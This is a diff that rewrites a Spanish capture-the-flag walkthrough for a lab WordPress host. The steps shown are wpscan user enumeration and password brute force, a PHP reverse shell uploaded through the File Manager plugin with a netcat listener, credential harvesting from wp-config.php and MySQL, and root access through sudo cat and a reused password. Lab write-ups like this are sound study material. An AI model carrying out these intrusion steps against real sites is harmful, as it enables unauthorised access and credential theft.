@@ -36,43 +36,41 @@ nmap -p80 -sCV 172.17.0.2 -oG targeted
 ![image](https://github.com/user-attachments/assets/3541d37b-ed61-4a33-8c81-007e43a2e26f)
 
 # Exploración Web
-Al navegar al puerto 80 vemos un pagina en el empieza diciendo si estamos listo para el reto. Y no se nada mas.
-
+Al acceder al puerto `80`, encontramos una página con un mensaje de inicio de reto. 
 ![image](https://github.com/user-attachments/assets/adcfc82b-bf2e-47ef-be51-5f096644bc53)
 
-Mirando en el codigo fuente de la pagina vemos un dominio, `pressenter.hl`, lo añadimos al /etc/hosts. Y accedemos
+En el código fuente aparece un dominio oculto: `pressenter.hl`. Lo añadimos en `/etc/hosts` y accedemos nuevamente.
 
 ![image](https://github.com/user-attachments/assets/bfe294e8-3aa3-48dd-8c6e-894491656b12)
 
-A simple vista se ve que es un WordPress, por lo que vamos a ver si tiene `wp-admin` o algun recurso de wordpresss.
+Observamos que el sitio usa WordPress, por lo que intentamos acceder a `wp-admin` y otros recursos de WordPress.
 
 ![image](https://github.com/user-attachments/assets/c01a2a13-8c20-4328-aa02-c205d2f0475c)
 
-Usaremos WPSCAN para enumerar usuario y asi hacer fuerza bruta.
+Usamos `WPSCAN` para enumerar los usuarios de WordPress:
 
 ```bash
 wpscan --url http://pressenter.hl/ -e vp,cb,u
 ```
 
-Encontramos dos usuarios `pressi` y `hacker`. 
-
-Vamos a empezar por `pressi` a ver si por fuerza bruta obtenemos su contraseña.
+Identificamos dos usuarios: `pressi` y `hacker`.
 
 ## Fuerza bruta 
 
+Ejecutamos fuerza bruta sobre `pressi` con el diccionario `rockyou.txt`:
 ```bash
 wpscan --url http://pressenter.hl/ -U pressi -P /usr/share/wordlists/rockyou.txt 
 ```
 
 ![image](https://github.com/user-attachments/assets/d46efe6d-7489-43f4-925d-98915ec82f38)
 
-Tenemos la contrasela `dumbass` del usuario `pressi`, vamos a acceder con ella.
+Obtenemos la contraseña `dumbass` para `pressi` y accedemos al panel de WordPress.
 
 ![image](https://github.com/user-attachments/assets/6330cd25-7744-4289-9cbd-f88a0202a524)
 
 # Reverse Shell
 
-Entramos en plugin y instalamos `File Manager`, el cual permite editar, eliminar, subir, renombrar, copiar, pegar, descargar, comprimir (zip), etc. y múltiples operaciones detro del servidor de la pagina.
+En el panel de WordPress, instalamos el plugin File Manager.
 
 ![image](https://github.com/user-attachments/assets/fea1d042-ab86-4ade-a8f1-4b831d2ba14a)
 
@@ -82,16 +80,17 @@ Aprovechamos la sección de subida de archivos para cargar una reverseshell en P
 
 ![image](https://github.com/user-attachments/assets/51f36ccf-e3a0-4fce-bcfb-5b3f8cba0d4e)
 
-En paralelo, escuchamos en nuestro sistema usando `netcat`:
+Iniciamos `netcat` en nuestro sistema para escuchar conexiones entrantes:
+
 ```bash 
 nc -lvnp 4444
 ```
 
-Luego, accedemos a la ruta de la página web donde hemos cargado la reverseshell:
+Accedemos a la reverse shell a través del navegador:
 
 ![image](https://github.com/user-attachments/assets/ba14667e-c769-4e9c-9e3c-8ba8c46fbf3d)
 
-Obtuvimos acceso inicial al servidor como www-data.
+Logramos acceso como` www-data`.
 
 ![image](https://github.com/user-attachments/assets/0cd9e20f-a723-41ff-8818-445f4d845005)
 
@@ -128,76 +127,22 @@ export TERM=xterm
 export SHELL=bash
 ```
 
-# Intrusion ww-data
+# Intrusion con el usuario enter.
 
-Ya que estamos dentro vemos que hay un usuario en el sistema llamado enter, ya que esto tiene wordpress instalado tendra un archivo llamado `wp-config.php` donde está instalado el wordpress y veremos una linea en la que esta el usuario y contraseña:
+Identificamos al usuario `enter` en el sistema y exploramos el archivo `wp-config.php` en WordPress, donde encontramos las credenciales de la base de datos (`admin` / `rooteable`).
 
 ![image](https://github.com/user-attachments/assets/794d5a1f-48ea-4f17-b1b1-2c5f8eaacb71)
-
-Encontramos el usuario de la base de datos `admin `y la contraseña `rooteable`.
-
-Accedemos a la base de datos a ver que encontramos.
 
 ```bash
 mysql -u admin --password=rooteable
 ```
 
-na vez dentro ejecutaremos esto:
+Una vez en MySQL, exploramos la base de datos `wordpress` y buscamos en la tabla `wp_usernames`:
 
-```css
-show databases;
-```
-
-esto nos mostrará las bases de datos, en nuestro caso tenemos estas:
-
-```css
-+--------------------+
-| Database           |
-+--------------------+
-| information_schema |
-| performance_schema |
-| wordpress          |
-+--------------------+
-```
-
-la única que nos puede interesar es la de wordpress, por lo que ahora ejecutaremos `use wordpress`. Ahora que seleccionamos la base de datos, ejecutaremos:
-
-```css
-show tables;
-```
-
-esto nos mostrará las tablas de la base de datos:
-
-```css
-+-----------------------+
-| Tables_in_wordpress   |
-+-----------------------+
-| wp_commentmeta        |
-| wp_comments           |
-| wp_links              |
-| wp_options            |
-| wp_postmeta           |
-| wp_posts              |
-| wp_term_relationships |
-| wp_term_taxonomy      |
-| wp_termmeta           |
-| wp_terms              |
-| wp_usermeta           |
-| wp_usernames          |
-| wp_users              |
-| wp_wpfm_backup        |
-+-----------------------+
-```
-
-y ahora ejecutamos:
-
-```css
+```sql
 select*from wp_usernames;
 ```
-
-y finalmente tendremos la contraseña de enter:
-
-```css
+```sql
 +----+----------+-----------------+---------------------+
 | id | username | password        | created_at          |
 +----+----------+-----------------+---------------------+
@@ -205,7 +150,13 @@ y finalmente tendremos la contraseña de enter:
 +----+----------+-----------------+---------------------+
 ```
 
-Ahora solo ejecutamos `su enter` y ponemos la contraseña, ya habremos escalado un usuario.
+Esto nos proporciona la contraseña de enter: `kernellinuxhack`.
+
+Con esto, cambiamos al usuario enter:
+
+```bash
+su enter
+```
 
 # Escalada de Privilegios 
 
@@ -213,13 +164,13 @@ Al ejecutar `sudo -l`, notamos que spencer tiene permisos para ejecutar `cat` co
 
 ![image](https://github.com/user-attachments/assets/e72c8d19-7017-480f-9c15-c52d5fd1114a)
 
-Después de investigar un poco he visto que en el directorio raiz del usuario enter tiene un archivo user.txt cosa que me ha hecho deducir que en el directorio root puede haber un equivalente y que pudiendo usar cat como root puedo leerlo.
+Exploramos la raíz de `enter` y encontramos `user.txt`, lo que sugiere que un archivo equivalente puede estar en el directorio `/root`. Como podemos usar `cat` como root, lo leemos:
 
 ![image](https://github.com/user-attachments/assets/7974fdd2-0ca0-4bb3-bf80-d8edb3b71112)
 
 ![image](https://github.com/user-attachments/assets/3c28faab-82ad-4216-b895-63a1ee64529d)
 
-Hay veces que la respuesta mas fácil es la ultima en probar. Después de un buen rato intentando encontrar la manera de obtener, por diferentes vías, acceso a la contraseña de root me a dado por probar con la misma que el usuario enter.
+Alternativamente, al probar la misma contraseña de `enter` para root, conseguimos acceso root:
 
 ![image](https://github.com/user-attachments/assets/617bef1d-5194-41ab-9785-5e84b6eb268e)
 
